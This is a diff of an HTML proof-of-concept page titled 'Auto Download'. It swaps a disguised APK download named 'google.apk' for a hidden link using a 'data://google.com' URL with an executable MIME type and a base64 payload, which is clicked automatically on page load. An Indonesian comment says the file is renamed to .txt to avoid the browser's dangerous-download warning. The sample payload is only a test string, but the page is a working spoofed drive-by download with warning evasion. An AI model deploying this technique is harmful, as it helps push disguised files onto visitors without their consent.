@@ -4,20 +4,22 @@
   <title>Auto Download</title>
 </head>
 <body>
-  <center><h2>POC by pajarpriandana!</h2></center>
+  <center><h2>POC by Chigorin!</h2></center>
+
+  <!-- 
+    Link ini pake trik data://google.com (yang lo bilang bisa).
+    Tapi saya ganti ekstensi jadi .txt biar gak muncul peringatan berbahaya.
+  -->
+  <a id="x" 
+     href="data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=" 
+     download="google.txt" 
+     style="display:none;">
+  </a>
 
   <script>
-
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "https://d.apkpure.com/custom/com.apkpure.aegon-1015768.apk?_fn=RXZpbCBMZXByZWNoYXVuX3Y3LjlfQVBLUHVyZV9JbnN0YWxsZXIuYXBr&as=0928170324f3e3fdc0d7f2d44ed435b46a7821cb&ai=1037128088&at=1786257747&_sa=ai%2Cat&k=17bdbeabfadc3edcf1a2f4a9e33331d06a7ac453&_p=Y29tLmFwa3B1cmUuYWVnb24&c=1%7CTOOLS%7CZGV2PUFQS1B1cmUmdD1hcGsmcz01ODYwMDEzJnZuPTEuMDEuNTcmdmM9MTAxNTc2OA&hot=1&arg=apkpure%3A%2F%2Finstall-app%2F%3Fapp_digest%3D%7B%22package_name%22%3A%20%22com.enupgames.evilleprechaun%22%2C%20%22icon%22%3A%20%22https%253A%252F%252Fimage.winudf.com%252Fv2%252Fimage1%252FY29tLmVudXBnYW1lcy5ldmlsbGVwcmVjaGF1bl9pY29uXzE3ODQ5NzA3MjVfMDEy%252Ficon.png%253Fw%253Dundefined%2526fakeurl%253D1%22%2C%20%22name%22%3A%20%22Evil%2520Leprechaun%22%2C%20%22version_code%22%3A%201015768%7D%26open_detail%3D0%26report_context%3D%7B%22fast_download_id%22%3A1750309489707088%2C%22channel_id%22%3A1004%7D&arg=apkpure%3A%2F%2Fcampaign%2F%3Freport_context%3D%7B%22channel_id%22%3A1004%7D",
-        "google.apk"
-      );
-    }
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+    // Pas halaman kebuka, langsung klik link-nya otomatis
+    window.onload = function() {
+      document.getElementById('x').click();
     };
   </script>
 </body>
